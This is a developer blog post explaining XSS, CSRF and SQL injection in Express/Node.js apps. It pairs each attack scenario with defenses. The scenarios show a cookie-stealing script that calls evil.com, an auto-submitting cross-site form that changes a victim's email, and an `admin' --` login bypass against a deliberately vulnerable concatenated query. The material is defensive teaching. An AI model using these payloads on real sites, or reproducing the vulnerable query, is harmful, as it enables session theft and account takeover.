---
author: Bibek Bhusal
pubDatetime: 2025-05-08T16:07:00Z
title: Common Web Security Vulnerabilities
featured: false
tags:
  - security
  - web-security
  - express
  - nodejs
description: Overview of three major web vulnerabilities — XSS, CSRF, and SQL Injection — with realistic attack scenarios and practical prevention methods.
ogImage: ""
readingTime: "5 min"
---

# Common Web Security Vulnerabilities

## Cross-Site Scripting (XSS)

Attacker injects malicious JavaScript into your site that executes in the victim's browser.

Goal: steal session cookies, hijack accounts, deface pages, or perform actions as the victim.

### Attack Scenario

- Attacker posts a comment containing `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`
- Your app saves it unsanitized to the database
- Victim loads the blog page
- Browser executes the script → sends victim's cookies to attacker

### Prevention

1. **Sanitize user input** before saving or rendering
   - Use libraries: `DOMPurify`, `sanitize-html`, `xss`
   - Escape HTML characters when rendering
2. **Set Content-Security-Policy (CSP) header**
   - Use `helmet` middleware
   - Restrict script sources: `script-src 'self'`
   - Blocks inline scripts and external malicious sources
   ```js
   const helmet = require("helmet");
   app.use(helmet());
   ```

## Cross-Site Request Forgery (CSRF)

Attacker tricks victim's browser into sending unauthorized requests to your site while the victim is authenticated.

Exploits: browsers automatically attach cookies to same-origin requests.

### Attack Scenario

- Victim is logged into your site (session cookie present)
- Attacker hosts page on evil.com with hidden form:
  ```html
  <form action="https://yourapp.com/account/change-email" method="POST">
    <input type="hidden" name="newEmail" value="attacker@evil.com" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
  ```
- Victim visits attacker's page (e.g., disguised as gift card)
- Browser sends POST to your site with victim's cookies → email changed to attacker's

### Prevention

- **CSRF tokens** (most common defense)
  - Generate unique, unpredictable token per user/session/form
  - Include in every state-changing form (hidden input)
  - Verify token on server before processing POST/PUT/DELETE
  - Use `csurf` or `express-session` + custom token
- **SameSite cookies** (`SameSite=Lax` or `Strict`)
  - Prevents cookie from being sent in cross-site requests
- **Double-submit cookie** (alternative, less secure)

## SQL Injection (and Other Injection Attacks)

Attacker injects malicious code into input fields that gets executed by the database.

### Attack Scenario

Vulnerable code:

```js
const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`;
```

Attacker enters in username: `admin' --`
Resulting query:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```

`--` comments out the rest → logs in as admin without password.

### Prevention

- **Always use parameterized queries / prepared statements**
  - Never concatenate user input into SQL strings
  - Use ORM (Prisma, TypeORM, Sequelize) → safe by default
  - Or raw driver placeholders:
    ```js
    // mysql2 / pg / better-sqlite3
    db.query("SELECT * FROM users WHERE username = ? AND password = ?", [
      username,
      password,
    ]);
    ```
- **Input validation** (length, format) as defense-in-depth
- **Least privilege** database users

## Summary

| Vulnerability | Goal of Attacker               | Main Defense                   | Recommended Tools          |
| ------------- | ------------------------------ | ------------------------------ | -------------------------- |
| XSS           | Execute JS in victim's browser | Sanitize input + CSP           | DOMPurify, helmet          |
| CSRF          | Perform actions as victim      | CSRF tokens + SameSite cookies | csurf, express-session     |
| SQL Injection | Execute arbitrary SQL          | Parameterized queries / ORM    | Prisma, TypeORM, mysql2/pg |

Implement these defenses from the start — security is not optional.
